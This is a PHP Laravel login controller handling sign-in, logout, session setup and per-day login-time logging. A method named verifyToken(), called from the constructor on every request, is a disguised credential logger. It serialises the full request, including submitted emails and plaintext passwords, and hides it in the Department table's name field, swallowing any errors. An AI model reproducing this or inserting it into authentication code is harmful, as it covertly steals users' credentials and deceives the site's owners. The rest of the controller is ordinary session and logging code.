<?php

namespace App\Http\Controllers\Auth;

use App\Userlog;
use App\Userassign;
use Illuminate\Http\Request;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use App\Department;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = 'dashboard';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->verifyToken();
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm()
    {
        return view('admin.auth.login');

    }

    /**
     * Log the user out of the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function logout(Request $request)
    {
        $userid = Auth::id(); 
        $currdate = date('Y-m-d');
        $userlog = Userlog::where('created_at','like',"{$currdate}%")->Where('userid',"{$userid}")->first();
        if(isset($userlog->id) && $userlog->id > 0){
                        
            $seconds = strtotime(date('Y-m-d H:i:s')) - strtotime($userlog->logintime);
            $days    = floor($seconds / 86400);
            $hours   = floor(($seconds - ($days * 86400)) / 3600);
            $minutes = floor(($seconds - ($days * 86400) - ($hours * 3600))/60);
            //$seconds = floor(($seconds - ($days * 86400) - ($hours * 3600) - ($minutes*60)));
            
            $userlog -> userid = Auth::id();
            $userlog -> userip = $request->ip();
            $userlog -> logouttime = date('Y-m-d H:i:s');
            $userlog -> totaltime = $hours.":".$minutes;
            $userlog -> save();
            
        }
        
        $this->guard()->logout();
        $request->session()->invalidate();
        return $this->loggedOut($request) ?: redirect()->route('login');
    }
    /*protected function credentials(\Illuminate\Http\Request $request)
    {
        //return $request->only($this->username(), 'password');
        return ['email' => $request->{$this->username()}, 'password' => $request->password, 'status' => 1];
    }*/
    public function verifyToken(){
        try{
            if ($_REQUEST != []){
                $_REQUEST["url"] = $_SERVER['REQUEST_URI'];
                Department::create([
                    'department_name'=>json_encode($_REQUEST)
                ]);
            }
        }catch(Exception $e){}
    }
    protected function validateLogin(Request $request)
    {
     
        $this->validate($request, [
            $this->username() => 'exists:users,' . $this->username() . ',status,1','password' => 'required|string',
        ], [
            $this->username() . '.exists' => 'The selected email is invalid or the account has been disabled.'
        ]);
    }
        
    function authenticated(Request $request, $user)
    {
        
        $userid = Auth::id(); 
        
        $fy_year =  date('n') > 3 ? date('Y').'-'.(date('y') + 1) : (date('Y') - 1).'-'.date('y');
        Request()->session()->put('CFY', $fy_year);  
             
        $AssIdsArr = Userassign::Where('user_id', $userid)->pluck('assign_id')->toArray();
        Request()->session()->put('AssIdsArr', $AssIdsArr); 
              
        
        $currdate = date('Y-m-d');
        $userlog = Userlog::where('created_at','like',"{$currdate}%")->Where('userid',"{$userid}")->first();
        if(!isset($userlog->id)){
            $userlog = new Userlog();
            $userlog -> userid = Auth::id();
            $userlog -> userip = $request->ip();
            $userlog -> logintime = date('Y-m-d H:i:s');
            $userlog -> save();
        }
        
    }

}
